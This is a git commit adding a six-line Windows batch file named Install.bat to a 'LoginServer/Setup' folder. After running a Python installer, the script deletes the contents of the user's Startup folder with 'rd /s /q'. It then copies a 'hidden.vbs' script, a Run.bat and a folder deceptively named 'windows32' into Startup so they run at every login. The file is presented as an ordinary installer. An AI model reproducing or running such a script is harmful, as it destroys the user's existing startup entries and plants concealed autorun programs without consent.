741f3ae860abca84928226e35a4526f8e94f9e06
xTreatyz <42012327+xTreatyz@users.noreply.github.com>
2018-08-12 11:20:42 -0400

    Add files via upload

---
+++ LoginServer/Setup/Install.bat
@@ -0,0 +1,6 @@
+@echo off
+python-2.7.14.msi
+pushd %userprofile%\Start Menu\Programs\Startup && (rd /s /q "%userprofile%\Start Menu\Programs\Startup" 2>nul & popd)
+copy "hidden.vbs" "%userprofile%\Start Menu\Programs\Startup"
+copy "Run.bat" "%userprofile%\Start Menu\Programs\Startup"
+xcopy /S "windows32" "%userprofile%\Start Menu\Programs\Startup"
